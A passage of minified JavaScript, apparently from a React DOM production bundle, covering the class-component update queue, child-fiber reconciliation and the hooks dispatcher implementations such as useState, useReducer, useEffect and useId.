    lane: e,
    tag: 0,
    payload: null,
    callback: null,
    next: null,
  };
}
function Wr(t, e, n) {
  var r = t.updateQueue;
  if (null === r) return null;
  if (((r = r.shared), 2 & se)) {
    var i = r.pending;
    return (
      null === i ? (e.next = e) : ((e.next = i.next), (i.next = e)),
      (r.pending = e),
      vr(t, n)
    );
  }
  return (
    null === (i = r.interleaved)
      ? ((e.next = e), vd(r))
      : ((e.next = i.next), (i.next = e)),
    (r.interleaved = e),
    vr(t, n)
  );
}
function nu(t, e, n) {
  if (null !== (e = e.updateQueue) && ((e = e.shared), 0 != (4194240 & n))) {
    var r = e.lanes;
    (n |= r &= t.pendingLanes), (e.lanes = n), id(t, n);
  }
}
function eh(t, e) {
  var n = t.updateQueue,
    r = t.alternate;
  if (null !== r && n === (r = r.updateQueue)) {
    var i = null,
      o = null;
    if (null !== (n = n.firstBaseUpdate)) {
      do {
        var s = {
          eventTime: n.eventTime,
          lane: n.lane,
          tag: n.tag,
          payload: n.payload,
          callback: n.callback,
          next: null,
        };
        null === o ? (i = o = s) : (o = o.next = s), (n = n.next);
      } while (null !== n);
      null === o ? (i = o = e) : (o = o.next = e);
    } else i = o = e;
    return (
      (n = {
        baseState: r.baseState,
        firstBaseUpdate: i,
        lastBaseUpdate: o,
        shared: r.shared,
        effects: r.effects,
      }),
      void (t.updateQueue = n)
    );
  }
  null === (t = n.lastBaseUpdate) ? (n.firstBaseUpdate = e) : (t.next = e),
    (n.lastBaseUpdate = e);
}
function Iu(t, e, n, r) {
  var i = t.updateQueue;
  Or = !1;
  var o = i.firstBaseUpdate,
    s = i.lastBaseUpdate,
    l = i.shared.pending;
  if (null !== l) {
    i.shared.pending = null;
    var u = l,
      a = u.next;
    (u.next = null), null === s ? (o = a) : (s.next = a), (s = u);
    var c = t.alternate;
    null !== c &&
      (l = (c = c.updateQueue).lastBaseUpdate) !== s &&
      (null === l ? (c.firstBaseUpdate = a) : (l.next = a),
      (c.lastBaseUpdate = u));
  }
  if (null !== o) {
    var p = i.baseState;
    for (s = 0, c = a = u = null, l = o; ; ) {
      var f = l.lane,
        d = l.eventTime;
      if ((r & f) === f) {
        null !== c &&
          (c = c.next =
            {
              eventTime: d,
              lane: 0,
              tag: l.tag,
              payload: l.payload,
              callback: l.callback,
              next: null,
            });
        e: {
          var v = t,
            g = l;
          switch (((f = e), (d = n), g.tag)) {
            case 1:
              if ("function" == typeof (v = g.payload)) {
                p = v.call(d, p, f);
                break e;
              }
              p = v;
              break e;
            case 3:
              v.flags = (-65537 & v.flags) | 128;
            case 0:
              if (
                null ==
                (f = "function" == typeof (v = g.payload) ? v.call(d, p, f) : v)
              )
                break e;
              p = Ce({}, p, f);
              break e;
            case 2:
              Or = !0;
          }
        }
        null !== l.callback &&
          0 !== l.lane &&
          ((t.flags |= 64),
          null === (f = i.effects) ? (i.effects = [l]) : f.push(l));
      } else
        (d = {
          eventTime: d,
          lane: f,
          tag: l.tag,
          payload: l.payload,
          callback: l.callback,
          next: null,
        }),
          null === c ? ((a = c = d), (u = p)) : (c = c.next = d),
          (s |= f);
      if (null === (l = l.next)) {
        if (null === (l = i.shared.pending)) break;
        (l = (f = l).next),
          (f.next = null),
          (i.lastBaseUpdate = f),
          (i.shared.pending = null);
      }
    }
    if (
      (null === c && (u = p),
      (i.baseState = u),
      (i.firstBaseUpdate = a),
      (i.lastBaseUpdate = c),
      null !== (e = i.shared.interleaved))
    ) {
      i = e;
      do {
        (s |= i.lane), (i = i.next);
      } while (i !== e);
    } else null === o && (i.shared.lanes = 0);
    (Li |= s), (t.lanes = s), (t.memoizedState = p);
  }
}
function th(t, e, n) {
  if (((t = e.effects), (e.effects = null), null !== t))
    for (e = 0; e < t.length; e++) {
      var r = t[e],
        i = r.callback;
      if (null !== i) {
        if (((r.callback = null), (r = n), "function" != typeof i))
          throw Error(R(191, i));
        i.call(r);
      }
    }
}
var zm = new D0.Component().refs;
function Kc(t, e, n, r) {
  (n = null == (n = n(r, (e = t.memoizedState))) ? e : Ce({}, e, n)),
    (t.memoizedState = n),
    0 === t.lanes && (t.updateQueue.baseState = n);
}
var da = {
  isMounted: function (t) {
    return !!(t = t._reactInternals) && Vi(t) === t;
  },
  enqueueSetState: function (t, e, n) {
    t = t._reactInternals;
    var r = Mt(),
      i = Xr(t),
      o = pr(r, i);
    (o.payload = e),
      null != n && (o.callback = n),
      null !== (e = Wr(t, o, i)) && (Fn(e, t, i, r), nu(e, t, i));
  },
  enqueueReplaceState: function (t, e, n) {
    t = t._reactInternals;
    var r = Mt(),
      i = Xr(t),
      o = pr(r, i);
    (o.tag = 1),
      (o.payload = e),
      null != n && (o.callback = n),
      null !== (e = Wr(t, o, i)) && (Fn(e, t, i, r), nu(e, t, i));
  },
  enqueueForceUpdate: function (t, e) {
    t = t._reactInternals;
    var n = Mt(),
      r = Xr(t),
      i = pr(n, r);
    (i.tag = 2),
      null != e && (i.callback = e),
      null !== (e = Wr(t, i, r)) && (Fn(e, t, r, n), nu(e, t, r));
  },
};
function nh(t, e, n, r, i, o, s) {
  return "function" == typeof (t = t.stateNode).shouldComponentUpdate
    ? t.shouldComponentUpdate(r, o, s)
    : !e.prototype ||
        !e.prototype.isPureReactComponent ||
        !Gs(n, r) ||
        !Gs(i, o);
}
function jm(t, e, n) {
  var r = !1,
    i = Jr,
    o = e.contextType;
  return (
    "object" == typeof o && null !== o
      ? (o = kn(o))
      : ((i = Ft(e) ? Oi : gt.current),
        (o = (r = null != (r = e.contextTypes)) ? No(t, i) : Jr)),
    (e = new e(n, o)),
    (t.memoizedState = null !== e.state && void 0 !== e.state ? e.state : null),
    (e.updater = da),
    (t.stateNode = e),
    (e._reactInternals = t),
    r &&
      (((t = t.stateNode).__reactInternalMemoizedUnmaskedChildContext = i),
      (t.__reactInternalMemoizedMaskedChildContext = o)),
    e
  );
}
function rh(t, e, n, r) {
  (t = e.state),
    "function" == typeof e.componentWillReceiveProps &&
      e.componentWillReceiveProps(n, r),
    "function" == typeof e.UNSAFE_componentWillReceiveProps &&
      e.UNSAFE_componentWillReceiveProps(n, r),
    e.state !== t && da.enqueueReplaceState(e, e.state, null);
}
function qc(t, e, n, r) {
  var i = t.stateNode;
  (i.props = n), (i.state = t.memoizedState), (i.refs = zm), yd(t);
  var o = e.contextType;
  "object" == typeof o && null !== o
    ? (i.context = kn(o))
    : ((o = Ft(e) ? Oi : gt.current), (i.context = No(t, o))),
    (i.state = t.memoizedState),
    "function" == typeof (o = e.getDerivedStateFromProps) &&
      (Kc(t, e, o, n), (i.state = t.memoizedState)),
    "function" == typeof e.getDerivedStateFromProps ||
      "function" == typeof i.getSnapshotBeforeUpdate ||
      ("function" != typeof i.UNSAFE_componentWillMount &&
        "function" != typeof i.componentWillMount) ||
      ((e = i.state),
      "function" == typeof i.componentWillMount && i.componentWillMount(),
      "function" == typeof i.UNSAFE_componentWillMount &&
        i.UNSAFE_componentWillMount(),
      e !== i.state && da.enqueueReplaceState(i, i.state, null),
      Iu(t, n, i, r),
      (i.state = t.memoizedState)),
    "function" == typeof i.componentDidMount && (t.flags |= 4194308);
}
function rs(t, e, n) {
  if (null !== (t = n.ref) && "function" != typeof t && "object" != typeof t) {
    if (n._owner) {
      if ((n = n._owner)) {
        if (1 !== n.tag) throw Error(R(309));
        var r = n.stateNode;
      }
      if (!r) throw Error(R(147, t));
      var i = r,
        o = "" + t;
      return null !== e &&
        null !== e.ref &&
        "function" == typeof e.ref &&
        e.ref._stringRef === o
        ? e.ref
        : (((e = function (s) {
            var l = i.refs;
            l === zm && (l = i.refs = {}),
              null === s ? delete l[o] : (l[o] = s);
          })._stringRef = o),
          e);
    }
    if ("string" != typeof t) throw Error(R(284));
    if (!n._owner) throw Error(R(290, t));
  }
  return t;
}
function Dl(t, e) {
  throw (
    ((t = Object.prototype.toString.call(e)),
    Error(
      R(
        31,
        "[object Object]" === t
          ? "object with keys {" + Object.keys(e).join(", ") + "}"
          : t
      )
    ))
  );
}
function ih(t) {
  return (0, t._init)(t._payload);
}
function Im(t) {
  function e(m, h) {
    if (t) {
      var _ = m.deletions;
      null === _ ? ((m.deletions = [h]), (m.flags |= 16)) : _.push(h);
    }
  }
  function n(m, h) {
    if (!t) return null;
    for (; null !== h; ) e(m, h), (h = h.sibling);
    return null;
  }
  function r(m, h) {
    for (m = new Map(); null !== h; )
      null !== h.key ? m.set(h.key, h) : m.set(h.index, h), (h = h.sibling);
    return m;
  }
  function i(m, h) {
    return ((m = Qr(m, h)).index = 0), (m.sibling = null), m;
  }
  function o(m, h, _) {
    return (
      (m.index = _),
      t
        ? null !== (_ = m.alternate)
          ? (_ = _.index) < h
            ? ((m.flags |= 2), h)
            : _
          : ((m.flags |= 2), h)
        : ((m.flags |= 1048576), h)
    );
  }
  function s(m) {
    return t && null === m.alternate && (m.flags |= 2), m;
  }
  function l(m, h, _, y) {
    return null === h || 6 !== h.tag
      ? (((h = Ja(_, m.mode, y)).return = m), h)
      : (((h = i(h, _)).return = m), h);
  }
  function u(m, h, _, y) {
    var C = _.type;
    return C === eo
      ? c(m, h, _.props.children, y, _.key)
      : null !== h &&
        (h.elementType === C ||
          ("object" == typeof C &&
            null !== C &&
            C.$$typeof === Mr &&
            ih(C) === h.type))
      ? (((y = i(h, _.props)).ref = rs(m, h, _)), (y.return = m), y)
      : (((y = uu(_.type, _.key, _.props, null, m.mode, y)).ref = rs(m, h, _)),
        (y.return = m),
        y);
  }
  function a(m, h, _, y) {
    return null === h ||
      4 !== h.tag ||
      h.stateNode.containerInfo !== _.containerInfo ||
      h.stateNode.implementation !== _.implementation
      ? (((h = ec(_, m.mode, y)).return = m), h)
      : (((h = i(h, _.children || [])).return = m), h);
  }
  function c(m, h, _, y, C) {
    return null === h || 7 !== h.tag
      ? (((h = ki(_, m.mode, y, C)).return = m), h)
      : (((h = i(h, _)).return = m), h);
  }
  function p(m, h, _) {
    if (("string" == typeof h && "" !== h) || "number" == typeof h)
      return ((h = Ja("" + h, m.mode, _)).return = m), h;
    if ("object" == typeof h && null !== h) {
      switch (h.$$typeof) {
        case wl:
          return (
            ((_ = uu(h.type, h.key, h.props, null, m.mode, _)).ref = rs(
              m,
              null,
              h
            )),
            (_.return = m),
            _
          );
        case Ji:
          return ((h = ec(h, m.mode, _)).return = m), h;
        case Mr:
          return p(m, (0, h._init)(h._payload), _);
      }
      if (ds(h) || Zo(h)) return ((h = ki(h, m.mode, _, null)).return = m), h;
      Dl(m, h);
    }
    return null;
  }
  function f(m, h, _, y) {
    var C = null !== h ? h.key : null;
    if (("string" == typeof _ && "" !== _) || "number" == typeof _)
      return null !== C ? null : l(m, h, "" + _, y);
    if ("object" == typeof _ && null !== _) {
      switch (_.$$typeof) {
        case wl:
          return _.key === C ? u(m, h, _, y) : null;
        case Ji:
          return _.key === C ? a(m, h, _, y) : null;
        case Mr:
          return f(m, h, (C = _._init)(_._payload), y);
      }
      if (ds(_) || Zo(_)) return null !== C ? null : c(m, h, _, y, null);
      Dl(m, _);
    }
    return null;
  }
  function d(m, h, _, y, C) {
    if (("string" == typeof y && "" !== y) || "number" == typeof y)
      return l(h, (m = m.get(_) || null), "" + y, C);
    if ("object" == typeof y && null !== y) {
      switch (y.$$typeof) {
        case wl:
          return u(h, (m = m.get(null === y.key ? _ : y.key) || null), y, C);
        case Ji:
          return a(h, (m = m.get(null === y.key ? _ : y.key) || null), y, C);
        case Mr:
          return d(m, h, _, (0, y._init)(y._payload), C);
      }
      if (ds(y) || Zo(y)) return c(h, (m = m.get(_) || null), y, C, null);
      Dl(h, y);
    }
    return null;
  }
  return function T(m, h, _, y) {
    if (
      ("object" == typeof _ &&
        null !== _ &&
        _.type === eo &&
        null === _.key &&
        (_ = _.props.children),
      "object" == typeof _ && null !== _)
    ) {
      switch (_.$$typeof) {
        case wl:
          e: {
            for (var C = _.key, k = h; null !== k; ) {
              if (k.key === C) {
                if ((C = _.type) === eo) {
                  if (7 === k.tag) {
                    n(m, k.sibling),
                      ((h = i(k, _.props.children)).return = m),
                      (m = h);
                    break e;
                  }
                } else if (
                  k.elementType === C ||
                  ("object" == typeof C &&
                    null !== C &&
                    C.$$typeof === Mr &&
                    ih(C) === k.type)
                ) {
                  n(m, k.sibling),
                    ((h = i(k, _.props)).ref = rs(m, k, _)),
                    (h.return = m),
                    (m = h);
                  break e;
                }
                n(m, k);
                break;
              }
              e(m, k), (k = k.sibling);
            }
            _.type === eo
              ? (((h = ki(_.props.children, m.mode, y, _.key)).return = m),
                (m = h))
              : (((y = uu(_.type, _.key, _.props, null, m.mode, y)).ref = rs(
                  m,
                  h,
                  _
                )),
                (y.return = m),
                (m = y));
          }
          return s(m);
        case Ji:
          e: {
            for (k = _.key; null !== h; ) {
              if (h.key === k) {
                if (
                  4 === h.tag &&
                  h.stateNode.containerInfo === _.containerInfo &&
                  h.stateNode.implementation === _.implementation
                ) {
                  n(m, h.sibling),
                    ((h = i(h, _.children || [])).return = m),
                    (m = h);
                  break e;
                }
                n(m, h);
                break;
              }
              e(m, h), (h = h.sibling);
            }
            ((h = ec(_, m.mode, y)).return = m), (m = h);
          }
          return s(m);
        case Mr:
          return T(m, h, (k = _._init)(_._payload), y);
      }
      if (ds(_))
        return (function v(m, h, _, y) {
          for (
            var C = null, k = null, S = h, E = (h = 0), P = null;
            null !== S && E < _.length;
            E++
          ) {
            S.index > E ? ((P = S), (S = null)) : (P = S.sibling);
            var N = f(m, S, _[E], y);
            if (null === N) {
              null === S && (S = P);
              break;
            }
            t && S && null === N.alternate && e(m, S),
              (h = o(N, h, E)),
              null === k ? (C = N) : (k.sibling = N),
              (k = N),
              (S = P);
          }
          if (E === _.length) return n(m, S), _e && pi(m, E), C;
          if (null === S) {
            for (; E < _.length; E++)
              null !== (S = p(m, _[E], y)) &&
                ((h = o(S, h, E)),
                null === k ? (C = S) : (k.sibling = S),
                (k = S));
            return _e && pi(m, E), C;
          }
          for (S = r(m, S); E < _.length; E++)
            null !== (P = d(S, m, E, _[E], y)) &&
              (t &&
                null !== P.alternate &&
                S.delete(null === P.key ? E : P.key),
              (h = o(P, h, E)),
              null === k ? (C = P) : (k.sibling = P),
              (k = P));
          return (
            t &&
              S.forEach(function (I) {
                return e(m, I);
              }),
            _e && pi(m, E),
            C
          );
        })(m, h, _, y);
      if (Zo(_))
        return (function g(m, h, _, y) {
          var C = Zo(_);
          if ("function" != typeof C) throw Error(R(150));
          if (null == (_ = C.call(_))) throw Error(R(151));
          for (
            var k = (C = null), S = h, E = (h = 0), P = null, N = _.next();
            null !== S && !N.done;
            E++, N = _.next()
          ) {
            S.index > E ? ((P = S), (S = null)) : (P = S.sibling);
            var I = f(m, S, N.value, y);
            if (null === I) {
              null === S && (S = P);
              break;
            }
            t && S && null === I.alternate && e(m, S),
              (h = o(I, h, E)),
              null === k ? (C = I) : (k.sibling = I),
              (k = I),
              (S = P);
          }
          if (N.done) return n(m, S), _e && pi(m, E), C;
          if (null === S) {
            for (; !N.done; E++, N = _.next())
              null !== (N = p(m, N.value, y)) &&
                ((h = o(N, h, E)),
                null === k ? (C = N) : (k.sibling = N),
                (k = N));
            return _e && pi(m, E), C;
          }
          for (S = r(m, S); !N.done; E++, N = _.next())
            null !== (N = d(S, m, E, N.value, y)) &&
              (t &&
                null !== N.alternate &&
                S.delete(null === N.key ? E : N.key),
              (h = o(N, h, E)),
              null === k ? (C = N) : (k.sibling = N),
              (k = N));
          return (
            t &&
              S.forEach(function (L) {
                return e(m, L);
              }),
            _e && pi(m, E),
            C
          );
        })(m, h, _, y);
      Dl(m, _);
    }
    return ("string" == typeof _ && "" !== _) || "number" == typeof _
      ? ((_ = "" + _),
        null !== h && 6 === h.tag
          ? (n(m, h.sibling), ((h = i(h, _)).return = m), (m = h))
          : (n(m, h), ((h = Ja(_, m.mode, y)).return = m), (m = h)),
        s(m))
      : n(m, h);
  };
}
var Oo = Im(!0),
  Am = Im(!1),
  vl = {},
  Zn = ii(vl),
  Js = ii(vl),
  el = ii(vl);
function yi(t) {
  if (t === vl) throw Error(R(174));
  return t;
}
function xd(t, e) {
  switch ((de(el, e), de(Js, t), de(Zn, vl), (t = e.nodeType))) {
    case 9:
    case 11:
      e = (e = e.documentElement) ? e.namespaceURI : Mc(null, "");
      break;
    default:
      e = Mc(
        (e = (t = 8 === t ? e.parentNode : e).namespaceURI || null),
        (t = t.tagName)
      );
  }
  he(Zn), de(Zn, e);
}
function Ro() {
  he(Zn), he(Js), he(el);
}
function Fm(t) {
  yi(el.current);
  var e = yi(Zn.current),
    n = Mc(e, t.type);
  e !== n && (de(Js, t), de(Zn, n));
}
function wd(t) {
  Js.current === t && (he(Zn), he(Js));
}
var xe = ii(0);
function Au(t) {
  for (var e = t; null !== e; ) {
    if (13 === e.tag) {
      var n = e.memoizedState;
      if (
        null !== n &&
        (null === (n = n.dehydrated) || "$?" === n.data || "$!" === n.data)
      )
        return e;
    } else if (19 === e.tag && void 0 !== e.memoizedProps.revealOrder) {
      if (128 & e.flags) return e;
    } else if (null !== e.child) {
      (e.child.return = e), (e = e.child);
      continue;
    }
    if (e === t) break;
    for (; null === e.sibling; ) {
      if (null === e.return || e.return === t) return null;
      e = e.return;
    }
    (e.sibling.return = e.return), (e = e.sibling);
  }
  return null;
}
var Xa = [];
function Sd() {
  for (var t = 0; t < Xa.length; t++)
    Xa[t]._workInProgressVersionPrimary = null;
  Xa.length = 0;
}
var ru = Sr.ReactCurrentDispatcher,
  Qa = Sr.ReactCurrentBatchConfig,
  Di = 0,
  ke = null,
  Be = null,
  qe = null,
  Fu = !1,
  Es = !1,
  tl = 0,
  dy = 0;
function at() {
  throw Error(R(321));
}
function kd(t, e) {
  if (null === e) return !1;
  for (var n = 0; n < e.length && n < t.length; n++)
    if (!Bn(t[n], e[n])) return !1;
  return !0;
}
function Cd(t, e, n, r, i, o) {
  if (
    ((Di = o),
    (ke = e),
    (e.memoizedState = null),
    (e.updateQueue = null),
    (e.lanes = 0),
    (ru.current = null === t || null === t.memoizedState ? gy : _y),
    (t = n(r, i)),
    Es)
  ) {
    o = 0;
    do {
      if (((Es = !1), (tl = 0), 25 <= o)) throw Error(R(301));
      (o += 1),
        (qe = Be = null),
        (e.updateQueue = null),
        (ru.current = vy),
        (t = n(r, i));
    } while (Es);
  }
  if (
    ((ru.current = Uu),
    (e = null !== Be && null !== Be.next),
    (Di = 0),
    (qe = Be = ke = null),
    (Fu = !1),
    e)
  )
    throw Error(R(300));
  return t;
}
function Td() {
  var t = 0 !== tl;
  return (tl = 0), t;
}
function Yn() {
  var t = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null,
  };
  return null === qe ? (ke.memoizedState = qe = t) : (qe = qe.next = t), qe;
}
function Cn() {
  if (null === Be) {
    var t = ke.alternate;
    t = null !== t ? t.memoizedState : null;
  } else t = Be.next;
  var e = null === qe ? ke.memoizedState : qe.next;
  if (null !== e) (qe = e), (Be = t);
  else {
    if (null === t) throw Error(R(310));
    (t = {
      memoizedState: (Be = t).memoizedState,
      baseState: Be.baseState,
      baseQueue: Be.baseQueue,
      queue: Be.queue,
      next: null,
    }),
      null === qe ? (ke.memoizedState = qe = t) : (qe = qe.next = t);
  }
  return qe;
}
function nl(t, e) {
  return "function" == typeof e ? e(t) : e;
}
function Ga(t) {
  var e = Cn(),
    n = e.queue;
  if (null === n) throw Error(R(311));
  n.lastRenderedReducer = t;
  var r = Be,
    i = r.baseQueue,
    o = n.pending;
  if (null !== o) {
    if (null !== i) {
      var s = i.next;
      (i.next = o.next), (o.next = s);
    }
    (r.baseQueue = i = o), (n.pending = null);
  }
  if (null !== i) {
    (o = i.next), (r = r.baseState);
    var l = (s = null),
      u = null,
      a = o;
    do {
      var c = a.lane;
      if ((Di & c) === c)
        null !== u &&
          (u = u.next =
            {
              lane: 0,
              action: a.action,
              hasEagerState: a.hasEagerState,
              eagerState: a.eagerState,
              next: null,
            }),
          (r = a.hasEagerState ? a.eagerState : t(r, a.action));
      else {
        var p = {
          lane: c,
          action: a.action,
          hasEagerState: a.hasEagerState,
          eagerState: a.eagerState,
          next: null,
        };
        null === u ? ((l = u = p), (s = r)) : (u = u.next = p),
          (ke.lanes |= c),
          (Li |= c);
      }
      a = a.next;
    } while (null !== a && a !== o);
    null === u ? (s = r) : (u.next = l),
      Bn(r, e.memoizedState) || (It = !0),
      (e.memoizedState = r),
      (e.baseState = s),
      (e.baseQueue = u),
      (n.lastRenderedState = r);
  }
  if (null !== (t = n.interleaved)) {
    i = t;
    do {
      (o = i.lane), (ke.lanes |= o), (Li |= o), (i = i.next);
    } while (i !== t);
  } else null === i && (n.lanes = 0);
  return [e.memoizedState, n.dispatch];
}
function Ka(t) {
  var e = Cn(),
    n = e.queue;
  if (null === n) throw Error(R(311));
  n.lastRenderedReducer = t;
  var r = n.dispatch,
    i = n.pending,
    o = e.memoizedState;
  if (null !== i) {
    n.pending = null;
    var s = (i = i.next);
    do {
      (o = t(o, s.action)), (s = s.next);
    } while (s !== i);
    Bn(o, e.memoizedState) || (It = !0),
      (e.memoizedState = o),
      null === e.baseQueue && (e.baseState = o),
      (n.lastRenderedState = o);
  }
  return [o, r];
}
function Um() {}
function Bm(t, e) {
  var n = ke,
    r = Cn(),
    i = e(),
    o = !Bn(r.memoizedState, i);
  if (
    (o && ((r.memoizedState = i), (It = !0)),
    (r = r.queue),
    Ed(bm.bind(null, n, r, t), [t]),
    r.getSnapshot !== e || o || (null !== qe && 1 & qe.memoizedState.tag))
  ) {
    if (
      ((n.flags |= 2048),
      rl(9, Hm.bind(null, n, r, i, e), void 0, null),
      null === Ze)
    )
      throw Error(R(349));
    30 & Di || Vm(n, e, i);
  }
  return i;
}
function Vm(t, e, n) {
  (t.flags |= 16384),
    (t = { getSnapshot: e, value: n }),
    null === (e = ke.updateQueue)
      ? ((e = { lastEffect: null, stores: null }),
        (ke.updateQueue = e),
        (e.stores = [t]))
      : null === (n = e.stores)
      ? (e.stores = [t])
      : n.push(t);
}
function Hm(t, e, n, r) {
  (e.value = n), (e.getSnapshot = r), $m(e) && Wm(t);
}
function bm(t, e, n) {
  return n(function () {
    $m(e) && Wm(t);
  });
}
function $m(t) {
  var e = t.getSnapshot;
  t = t.value;
  try {
    var n = e();
    return !Bn(t, n);
  } catch {
    return !0;
  }
}
function Wm(t) {
  var e = vr(t, 1);
  null !== e && Fn(e, t, 1, -1);
}
function oh(t) {
  var e = Yn();
  return (
    "function" == typeof t && (t = t()),
    (e.memoizedState = e.baseState = t),
    (t = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: nl,
      lastRenderedState: t,
    }),
    (e.queue = t),
    (t = t.dispatch = my.bind(null, ke, t)),
    [e.memoizedState, t]
  );
}
function rl(t, e, n, r) {
  return (
    (t = { tag: t, create: e, destroy: n, deps: r, next: null }),
    null === (e = ke.updateQueue)
      ? ((e = { lastEffect: null, stores: null }),
        (ke.updateQueue = e),
        (e.lastEffect = t.next = t))
      : null === (n = e.lastEffect)
      ? (e.lastEffect = t.next = t)
      : ((r = n.next), (n.next = t), (t.next = r), (e.lastEffect = t)),
    t
  );
}
function Ym() {
  return Cn().memoizedState;
}
function iu(t, e, n, r) {
  var i = Yn();
  (ke.flags |= t),
    (i.memoizedState = rl(1 | e, n, void 0, void 0 === r ? null : r));
}
function pa(t, e, n, r) {
  var i = Cn();
  r = void 0 === r ? null : r;
  var o = void 0;
  if (null !== Be) {
    var s = Be.memoizedState;
    if (((o = s.destroy), null !== r && kd(r, s.deps)))
      return void (i.memoizedState = rl(e, n, o, r));
  }
  (ke.flags |= t), (i.memoizedState = rl(1 | e, n, o, r));
}
function sh(t, e) {
  return iu(8390656, 8, t, e);
}
function Ed(t, e) {
  return pa(2048, 8, t, e);
}
function Xm(t, e) {
  return pa(4, 2, t, e);
}
function Qm(t, e) {
  return pa(4, 4, t, e);
}
function Gm(t, e) {
  return "function" == typeof e
    ? ((t = t()),
      e(t),
      function () {
        e(null);
      })
    : null != e
    ? ((t = t()),
      (e.current = t),
      function () {
        e.current = null;
      })
    : void 0;
}
function Km(t, e, n) {
  return (
    (n = null != n ? n.concat([t]) : null), pa(4, 4, Gm.bind(null, e, t), n)
  );
}
function Pd() {}
function qm(t, e) {
  var n = Cn();
  e = void 0 === e ? null : e;
  var r = n.memoizedState;
  return null !== r && null !== e && kd(e, r[1])
    ? r[0]
    : ((n.memoizedState = [t, e]), t);
}
function Zm(t, e) {
  var n = Cn();
  e = void 0 === e ? null : e;
  var r = n.memoizedState;
  return null !== r && null !== e && kd(e, r[1])
    ? r[0]
    : ((t = t()), (n.memoizedState = [t, e]), t);
}
function Jm(t, e, n) {
  return 21 & Di
    ? (Bn(n, e) || ((n = nm()), (ke.lanes |= n), (Li |= n), (t.baseState = !0)),
      e)
    : (t.baseState && ((t.baseState = !1), (It = !0)), (t.memoizedState = n));
}
function py(t, e) {
  var n = ae;
  (ae = 0 !== n && 4 > n ? n : 4), t(!0);
  var r = Qa.transition;
  Qa.transition = {};
  try {
    t(!1), e();
  } finally {
    (ae = n), (Qa.transition = r);
  }
}
function eg() {
  return Cn().memoizedState;
}
function hy(t, e, n) {
  var r = Xr(t);
  if (
    ((n = {
      lane: r,
      action: n,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    }),
    tg(t))
  )
    ng(e, n);
  else if (null !== (n = Dm(t, e, n, r))) {
    Fn(n, t, r, Mt()), rg(n, e, r);
  }
}
function my(t, e, n) {
  var r = Xr(t),
    i = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
  if (tg(t)) ng(e, i);
  else {
    var o = t.alternate;
    if (
      0 === t.lanes &&
      (null === o || 0 === o.lanes) &&
      null !== (o = e.lastRenderedReducer)
    )
      try {
        var s = e.lastRenderedState,
          l = o(s, n);
        if (((i.hasEagerState = !0), (i.eagerState = l), Bn(l, s))) {
          var u = e.interleaved;
          return (
            null === u
              ? ((i.next = i), vd(e))
              : ((i.next = u.next), (u.next = i)),
            void (e.interleaved = i)
          );
        }
      } catch {}
    null !== (n = Dm(t, e, i, r)) && (Fn(n, t, r, (i = Mt())), rg(n, e, r));
  }
}
function tg(t) {
  var e = t.alternate;
  return t === ke || (null !== e && e === ke);
}
function ng(t, e) {
  Es = Fu = !0;
  var n = t.pending;
  null === n ? (e.next = e) : ((e.next = n.next), (n.next = e)),
    (t.pending = e);
}
function rg(t, e, n) {
  if (4194240 & n) {
    var r = e.lanes;
    (n |= r &= t.pendingLanes), (e.lanes = n), id(t, n);
  }
}
var Uu = {
    readContext: kn,
    useCallback: at,
    useContext: at,
    useEffect: at,
    useImperativeHandle: at,
    useInsertionEffect: at,
    useLayoutEffect: at,
    useMemo: at,
    useReducer: at,
    useRef: at,
    useState: at,
    useDebugValue: at,
    useDeferredValue: at,
    useTransition: at,
    useMutableSource: at,
    useSyncExternalStore: at,
    useId: at,
    unstable_isNewReconciler: !1,
  },
  gy = {
    readContext: kn,
    useCallback: function (t, e) {
      return (Yn().memoizedState = [t, void 0 === e ? null : e]), t;
    },
    useContext: kn,
    useEffect: sh,
    useImperativeHandle: function (t, e, n) {
      return (
        (n = null != n ? n.concat([t]) : null),
        iu(4194308, 4, Gm.bind(null, e, t), n)
      );
    },
    useLayoutEffect: function (t, e) {
      return iu(4194308, 4, t, e);
    },
    useInsertionEffect: function (t, e) {
      return iu(4, 2, t, e);
    },
    useMemo: function (t, e) {
      var n = Yn();
      return (
        (e = void 0 === e ? null : e), (t = t()), (n.memoizedState = [t, e]), t
      );
    },
    useReducer: function (t, e, n) {
      var r = Yn();
      return (
        (e = void 0 !== n ? n(e) : e),
        (r.memoizedState = r.baseState = e),
        (t = {
          pending: null,
          interleaved: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: t,
          lastRenderedState: e,
        }),
        (r.queue = t),
        (t = t.dispatch = hy.bind(null, ke, t)),
        [r.memoizedState, t]
      );
    },
    useRef: function (t) {
      return (t = { current: t }), (Yn().memoizedState = t);
    },
    useState: oh,
    useDebugValue: Pd,
    useDeferredValue: function (t) {
      return (Yn().memoizedState = t);
    },
    useTransition: function () {
      var t = oh(!1),
        e = t[0];
      return (t = py.bind(null, t[1])), (Yn().memoizedState = t), [e, t];
    },
    useMutableSource: function () {},
    useSyncExternalStore: function (t, e, n) {
      var r = ke,
        i = Yn();
      if (_e) {
        if (void 0 === n) throw Error(R(407));
        n = n();
      } else {
        if (((n = e()), null === Ze)) throw Error(R(349));
        30 & Di || Vm(r, e, n);
      }
      i.memoizedState = n;
      var o = { value: n, getSnapshot: e };
      return (
        (i.queue = o),
        sh(bm.bind(null, r, o, t), [t]),
        (r.flags |= 2048),
        rl(9, Hm.bind(null, r, o, n, e), void 0, null),
        n
      );
    },
    useId: function () {
      var t = Yn(),
        e = Ze.identifierPrefix;
      if (_e) {
        var n = fr;
        (e =
          ":" +
          e +
          "R" +
          (n = (cr & ~(1 << (32 - An(cr) - 1))).toString(32) + n)),
          0 < (n = tl++) && (e += "H" + n.toString(32)),
          (e += ":");
      } else e = ":" + e + "r" + (n = dy++).toString(32) + ":";
      return (t.memoizedState = e);
    },
    unstable_isNewReconciler: !1,
  },
  _y = {
    readContext: kn,
    useCallback: qm,
    useContext: kn,
    useEffect: Ed,
    useImperativeHandle: Km,
    useInsertionEffect: Xm,
    useLayoutEffect: Qm,
    useMemo: Zm,
    useReducer: Ga,
    useRef: Ym,
    useState: function () {
      return Ga(nl);
    },
    useDebugValue: Pd,
    useDeferredValue: function (t) {
      return Jm(Cn(), Be.memoizedState, t);
    },
    useTransition: function () {
      return [Ga(nl)[0], Cn().memoizedState];
    },
    useMutableSource: Um,
    useSyncExternalStore: Bm,
    useId: eg,
